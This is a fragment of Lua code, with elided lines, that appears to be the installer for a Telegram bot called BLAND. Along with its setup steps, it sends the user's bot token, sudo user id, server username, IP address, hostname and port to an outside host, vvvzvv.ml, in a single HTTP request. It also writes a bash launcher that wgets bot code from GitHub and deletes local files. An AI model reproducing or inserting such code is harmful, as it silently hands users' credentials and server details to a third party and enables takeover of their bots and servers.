...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/BLAND.php?p=BLANDTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://vvvzvv.ml/index/BLAND.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://vvvzvv.ml/index/BLAND.php?n=BLANDTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("BLAND", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/BLAND
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr BLAND.lua
wget "https://raw.githubusercontent.com/BlAnD-TEAM/BLAND/main/BLAND.lua"
while(true) do
rm -fr ../.telegram-cli
